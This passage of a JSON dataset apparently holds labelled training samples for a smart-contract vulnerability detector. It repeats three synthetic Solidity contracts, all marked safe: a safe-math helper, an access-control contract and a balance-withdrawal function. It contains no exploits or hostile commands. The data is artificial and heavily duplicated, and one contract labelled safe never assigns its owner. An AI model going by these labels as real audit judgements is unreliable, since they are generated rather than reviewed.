    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 2",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 3",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 4",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 5",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 6",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 7",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 8",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 9",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 10",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 11",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 12",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 13",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 14",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 15",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 16",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 17",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 18",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 19",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 20",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 21",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 22",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 23",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 24",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 25",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 26",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 27",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 28",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 29",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 30",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 31",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
